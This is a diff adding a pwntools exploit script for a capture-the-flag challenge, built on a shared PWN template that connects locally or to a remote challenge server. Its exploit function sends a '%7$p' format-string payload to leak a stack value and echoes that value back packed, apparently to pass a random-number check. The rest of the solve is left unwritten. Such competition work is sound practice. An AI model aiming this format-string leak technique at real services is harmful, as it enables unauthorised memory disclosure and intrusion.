@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+# This template is created by ZD (former helper and PWN player) and many more PWN players
+# Special thanks to them!
+from pwn import *
+#----------------------Packing Utils----------------------#
+p64 = lambda n: packing.pack(n, 64)
+u64 = lambda n: packing.unpack(n, 64)
+u32 = lambda n: packing.unpack(n, 32)
+uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
+uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
+#---------------------Common Settings---------------------#
+bin_path = './program' # put the executable name here
+local_libc_path = './libc.so.6'
+remote_url = 'chal.firebird.sh'
+remote_port =  35041 # remember to change the port here
+
+#context.log_level = 'debug'
+context.binary = bin_path
+
+gdb_break_points = [
+    # add addresses or symbols or symbol+offset here to set break point automatically
+    # e.g. 'main','main+16','0x400500'
+]
+#---------------------------------------------------------#
+#------------------------Exploit--------------------------#
+#---------------------------------------------------------#
+def initialize_io(mode: str) -> process | remote:
+    gdbscripts = "handle SIGALRM ignore\n"
+    for bp in gdb_break_points:
+        if bp:  # is not empty str
+            gdbscripts += f"b* {bp}\n"
+    if mode == "_debug":
+        # context.terminal = ["tmux", "splitw", "-h"]  
+        # uncomment the previous line to use split terminal instead of opening a new terminal
+        # this only works if you are using tmux
+        return gdb.debug(bin_path, gdbscripts)
+    elif mode == "_local":
+        return process(bin_path)
+    elif mode == "_remote":
+        return remote(remote_url, remote_port)
+    else:
+        exit(-1)
+import time
+#-----------------------Main Pwn--------------------------#
+def do_pwn(io: process | remote) -> None:
+    sla = io.sendlineafter
+    sa = io.sendafter
+    sl = io.sendline
+    sd = io.send
+    rl = io.recvline
+    ru = io.recvuntil
+    rc = io.recv
+    rop = ROP(bin_path)
+    elf = ELF(bin_path)
+    # libc = ELF(local_libc_path) # uncomment this line to set libc object 
+    def exploit() -> None:
+        io.recvuntil(b":")
+        io.sendline(b"%7$p")
+        io.recvuntil(b"0x")
+        hex_str = io.recvuntil(b"\n", drop=True)  # receive until newline
+        random1 = int(hex_str.decode(), 16)  # convert hex string to int
+        print(f"Random1: {hex(random1)}")    # print in hex for verification
+                
+        io.recvuntil(b":")
+        io.sendline(p64(random1))
+
+        
+        return # write your solve here
+    exploit()
+#---------------------------------------------------------#
+#--------------------End of Exploit-----------------------#
+#---------------------------------------------------------#
+def main():
+    mode = "_local"
+    mode = "_remote"
+    #mode = "_debug" # comment this line to change from local debugging to remote exploitation
+    io = initialize_io(mode)
+    do_pwn(io)
+    io.interactive()
+
+if __name__ == '__main__': # 0x1cf94508 random2 
+    main()
+#----------------------------EOF---------------------------#
